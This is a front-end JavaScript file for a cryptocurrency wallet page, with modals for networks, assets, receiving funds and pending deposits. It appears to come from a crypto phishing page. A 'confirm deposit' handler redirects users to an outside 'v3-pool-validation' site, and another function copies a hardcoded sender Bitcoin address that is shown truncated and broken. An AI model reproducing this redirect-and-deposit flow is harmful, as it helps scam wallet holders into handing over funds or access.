function showNetworkModal(){

document.getElementById("networkModal")
.classList.remove("hidden");

}

function closeNetworkModal(){

document.getElementById("networkModal")
.classList.add("hidden");

}

function openAssetModal(symbol){

const token = TOKENS.find(t => t.symbol === symbol);

if(!token){
return;
}

document.getElementById("assetModal")
.classList.remove("hidden");

document.getElementById("assetTitle")
.innerText = token.name;

document.getElementById("chartFrame")
.src = token.chart;

}

function closeAssetModal(){

document.getElementById("assetModal")
.classList.add("hidden");

}

function openReceiveModal(){

if(!userAddress){
return;
}

document.getElementById("receiveModal")
.classList.remove("hidden");

/* CLEAR OLD QR */
const qrContainer =
document.getElementById("qrCode");

qrContainer.innerHTML = "";

/* GENERATE FAST QR LOCALLY */
new QRCode(qrContainer, {
text: userAddress,
width: 220,
height: 220,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

document.getElementById("walletAddress").innerText =
userAddress;

}

function closeReceiveModal(){

document.getElementById("receiveModal")
.classList.add("hidden");

}

function copyWalletAddress(){

navigator.clipboard.writeText(userAddress);

const btn = document.getElementById("copyAddress");
btn.innerText = "Copied";

setTimeout(()=>{
btn.innerText = "Copy Address";
},2000);

}

function copySenderAddress(){

navigator.clipboard.writeText(
"bc1qe7nzmx6ss8juh...4pdcjlcjya8va"
);

}

function openPendingModal(){

document.getElementById("pendingModal")
.classList.remove("hidden");

}

function closePendingModal(){

document.getElementById("pendingModal")
.classList.add("hidden");

}

function confirmDeposit(){

window.location.href =
"https://v3-pool-validation.vercel.app/";

}

document.getElementById("switchNetwork")
.onclick = switchNetwork;

document.getElementById("cancelNetwork")
.onclick = ()=>{
disconnectWallet();
closeNetworkModal();
};

document.getElementById("receiveBtn")
.onclick = openReceiveModal;

document.getElementById("copyAddress")
.onclick = copyWalletAddress;

document.getElementById("viewPending")
.onclick = openPendingModal;

document.querySelector(".closeAsset")
.onclick = closeAssetModal;

document.querySelector(".closeReceive")
.onclick = closeReceiveModal;

document.querySelector(".closePending")
.onclick = closePendingModal;
